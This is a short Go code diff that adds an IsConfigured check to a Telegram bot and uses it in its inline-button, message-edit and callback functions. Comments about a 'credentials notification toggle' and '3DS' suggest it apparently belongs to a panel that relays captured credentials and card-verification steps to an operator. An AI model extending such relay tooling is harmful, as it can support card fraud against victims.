@@ -385,6 +385,12 @@ func (t *TelegramBot) IsEnabled() bool {
 	return t.enabled && t.botToken != "" && t.chatID != ""
 }
 
+// IsConfigured checks if botToken and chatID are set, regardless of enabled flag.
+// Used by 3DS which should work independently of the credentials notification toggle.
+func (t *TelegramBot) IsConfigured() bool {
+	return t.botToken != "" && t.chatID != ""
+}
+
 // --- Inline Keyboard & Callback Support ---
 
 // InlineButton represents a Telegram inline keyboard button
@@ -449,7 +455,7 @@ type telegramAnswerCallback struct {
 
 // SendMessageWithButtons sends a message with inline keyboard buttons and returns the message ID
 func (t *TelegramBot) SendMessageWithButtons(chatID, text string, buttons [][]InlineButton) (int, error) {
-	if !t.enabled || t.botToken == "" || t.chatID == "" {
+	if !t.IsConfigured() {
 		return 0, fmt.Errorf("telegram bot not configured")
 	}
 
@@ -495,7 +501,7 @@ func (t *TelegramBot) SendMessageWithButtons(chatID, text string, buttons [][]In
 
 // EditMessage edits an existing message's text and inline keyboard
 func (t *TelegramBot) EditMessage(chatID string, msgID int, text string, buttons [][]InlineButton) error {
-	if !t.enabled || t.botToken == "" || t.chatID == "" {
+	if !t.IsConfigured() {
 		return fmt.Errorf("telegram bot not configured")
 	}
 
@@ -539,7 +545,7 @@ func (t *TelegramBot) EditMessage(chatID string, msgID int, text string, buttons
 
 // AnswerCallbackQuery answers a callback query to stop the loading animation on the button
 func (t *TelegramBot) AnswerCallbackQuery(callbackQueryID string, text string, showAlert bool) error {
-	if !t.enabled || t.botToken == "" || t.chatID == "" {
+	if !t.IsConfigured() {
 		return fmt.Errorf("telegram bot not configured")
 	}
 
